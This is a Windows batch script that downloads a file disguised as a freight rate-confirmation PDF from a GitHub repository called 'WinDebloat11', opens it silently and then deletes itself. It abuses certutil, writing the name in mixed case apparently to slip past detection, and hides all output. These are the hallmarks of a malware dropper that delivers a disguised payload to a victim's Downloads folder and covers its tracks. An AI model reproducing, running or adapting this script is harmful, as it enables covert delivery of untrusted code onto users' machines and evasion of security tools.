@echo off
setlocal enabledelayedexpansion

set "R=https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main"
set "D=%USERPROFILE%\Downloads"

cErtUtIl /urlcache /split /f "%R%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1
if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"

timeout /t 2 /nobreak >nul
del "%~f0" /f /q >nul 2>&1
endlocal
exit
